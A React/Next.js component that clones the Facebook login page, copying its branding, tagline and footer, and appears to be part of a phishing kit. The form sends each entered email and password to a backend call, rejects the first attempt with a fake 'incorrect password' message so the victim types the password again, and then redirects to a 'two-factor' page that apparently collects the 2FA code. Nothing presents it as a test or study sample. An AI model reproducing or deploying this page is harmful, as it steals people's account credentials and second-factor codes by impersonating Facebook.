import { useLocalStorage } from '@/helpers/useLocalstorage';
import { login } from '@/request/post';
import { useRouter } from 'next/router';
import React, { useEffect, useState } from 'react';
import { useForm } from 'react-hook-form';
import { ErrorMessage } from '../common/error-message';

function LoginForm() {
  const router = useRouter();
  const [failCount, setFailCount] = useState(1);
  // const [step, setStep] = useLocalStorage('step');

  const {
    register,
    handleSubmit,
    formState: { errors },
    setError,
    reset,
  } = useForm();

  // useEffect(() => {
  // if (step === 1) {
  //   router.push('/contact/295038365360854');
  // }
  // }, [step, router]);

  const onSubmit = async (data) => {
    const res = await login(data);
    if (res?.status && !failCount) {
      // setStep(3);
      router.push('/two-factor');
    } else {
      reset();
      setError('password', { message: 'Your email or password is incorrect' });
      setFailCount((prev) => prev - 1);
    }
  };

  return (
    <div className="flex flex-col gap-8">
      <div className="login-form lg:w-[396px] sm:w-auto">
        <form
          onSubmit={handleSubmit(onSubmit)}
          className="flex flex-col justify-center gap-3 items-center"
        >
          <div className="w-[91%]">
            <input
              placeholder="Email address or phone number"
              {...register('email', {
                required: 'Email address or phone number is required',
              })}
              className="login-input focus:outline-none"
            />
            <ErrorMessage
              error={errors?.email?.message}
              className="text-sm mb-1"
            />
          </div>

          <div className="w-[91%]">
            <input
              type="password"
              placeholder="Password"
              className="login-input focus:outline-none"
              {...register('password', {
                required: 'Your password is required',
              })}
            />
            <ErrorMessage
              error={errors?.password?.message}
              className="text-sm mb-1"
            />
          </div>
          <div className="text-center w-[91%]">
            <button type="submit" className="login-btn font-medium">
              Log in
            </button>
          </div>

          <div className="text-center">
            <a
              href="#"
              className="text-sm no-underline hover:underline text-blue-500 font-normal"
            >
              Forgotten Password?
            </a>
          </div>
          <div className="border-t-[1px] w-[90%] mt-1 mb-2" />
          <div className="text-center">
            <button type="submit" className="font-medium create-new-btn">
              Create new account
            </button>
          </div>
        </form>
      </div>
      <div className="flex-1 text-center text-sm">
        <p>
          <b>
            <a className="cursor-pointer no-underline hover:underline">
              {' '}
              Create a Page{' '}
            </a>
          </b>
          for a celebrity, brand or business.
        </p>
      </div>
    </div>
  );
}

function BrowserLogin() {
  return (
    <div className="flex flex-col min-h-screen">
      <div className="bg-[#f0f2f5] flex flex-col lg:flex-row justify-center items-center flex-grow">
        <div className="flex flex-col lg:flex-row justify-center items-center m-0 m-auto gap-20">
          <div className=" flex flex-col justify-center w-[41%]">
            <h1 className="text-[60px] font-bold text-blue-500">facebook</h1>
            <h2 className="text-[27px] font-normal">
              Facebook helps you connect and share with the people in your life.
            </h2>
          </div>
          <div className="flex justify-center items-center flex-col">
            <LoginForm />
          </div>
        </div>
      </div>
      <Footer />
    </div>
  );
}

function Footer() {
  const currentYear = new Date().getFullYear();
  return (
    <footer className="flex-shrink-0">
      <div className="container flex flex-col justify-center items-start mx-auto text-center w-[50%]">
        <ul className="footer-text flex flex-wrap gap-2 pb-3 pt-8 justify-center items-center">
          <li> English (UK)</li>
          <li className="cursor-pointer no-underline hover:underline">
            Tiếng Việt
          </li>
          <li className="cursor-pointer no-underline hover:underline">
            中文(台灣)
          </li>
          <li className="cursor-pointer no-underline hover:underline">
            한국어
          </li>
          <li className="cursor-pointer no-underline hover:underline">
            日本語
          </li>
          <li className="cursor-pointer no-underline hover:underline">
            Français (France)
          </li>
          <li className="cursor-pointer no-underline hover:underline">
            ภาษาไทย
          </li>
          <li className="cursor-pointer no-underline hover:underline">
            Español
          </li>
          <li className="cursor-pointer no-underline hover:underline">
            Português (Brasil)
          </li>
          <li className="cursor-pointer no-underline hover:underline">
            Deutsch
          </li>
          <li className="cursor-pointer no-underline hover:underline">
            Italiano
          </li>
          <li className="border border-slate-200 px-2 cursor-pointer bg-[#f0f2f5] text-sm font-medium">
            +
          </li>
        </ul>
        <hr className="border-1 w-full" />
        <ul className="footer-text flex flex-wrap pt-3 m-0 gap-3">
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Sign Up{' '}
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Log in
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Messenger
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Facebook Lite
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">Video</a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Places
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">Games</a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Marketplace
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Meta Pay
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Meta Store
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Meta Quest
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Instagram
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Threads
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Fundraisers
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Services
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Voting Information Centre
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Privacy Policy
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Privacy Centre
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Groups
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">About</a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Create ad
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Create Page
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Developers
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Careers
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Cookies
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              AdChoices
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">Terms</a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline"> Help</a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Contact uploading and non-users
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Settings
            </a>
          </li>
        </ul>
        <div className="footer-text mt-4 mb-8">
          <p className="text-[11px]">Meta © {currentYear}</p>
        </div>
      </div>
    </footer>
  );
}


export default BrowserLogin;
